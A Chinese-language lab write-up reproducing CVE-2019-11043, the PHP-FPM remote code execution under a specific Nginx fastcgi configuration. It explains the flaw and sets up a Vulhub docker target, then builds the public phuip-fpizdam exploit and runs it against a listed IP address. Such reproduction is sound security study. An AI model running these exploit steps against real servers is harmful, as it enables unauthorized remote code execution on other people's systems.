<!-- TOC -->

- [[CVE-2019-11043]PHP-FPM在Nginx特定配置下RCE复现](#cve-2019-11043php-fpm在nginx特定配置下rce复现)
    - [漏洞概述](#漏洞概述)
    - [漏洞影响范围](#漏洞影响范围)
    - [漏洞复现](#漏洞复现)

<!-- /TOC -->
# [CVE-2019-11043]PHP-FPM在Nginx特定配置下RCE复现
## 漏洞概述
在2019年9 月 14 日至 18 举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。

Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。

漏洞编号：CVE-2019-11043

漏洞 PoC 在 10 月 22 日公开。


## 漏洞影响范围

**PHP 5.6-7.x**

Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。

```
 location ~ [^/]\.php(/|$) {

        fastcgi_split_path_info ^(.+?\.php)(/.*)$;

        fastcgi_param PATH_INFO       $fastcgi_path_info;

        fastcgi_pass   php:9000;

        ...
  }
}
```

## 漏洞复现
复现用的是[Vulhub](https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043)靶场，配合Go环境。

基于**Ubuntu 18.04**的漏洞环境部署如下：
```
apt-get install docker
service docker start
apt-get install python3-pip
pip3 install docker-compose

wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
apt-get install unzip
unzip vulhub-master.zip
cd vulhub-master

cd PHP/CVE-2019-11043
docker-compose up -d
```

基于**Windows 10**的Go环境的漏洞利用工具部署如下:
下载安装[Golang](https://dl.google.com/go/go1.13.3.windows-amd64.msi)后，
```
git clone https://github.com/neex/phuip-fpizdam #或浏览器下：https://github.com/neex/phuip-fpizdam/archive/master.zip
cd phuip-fpizdam
go get -v
go build 就会生成:phuip-fpizdam.exe

phuip-fpizdam.exe http://144.202.102.252:8080/index.php
```

![](https://www.github.com/52stu/Images/raw/master/xsj/1571888349020.png)

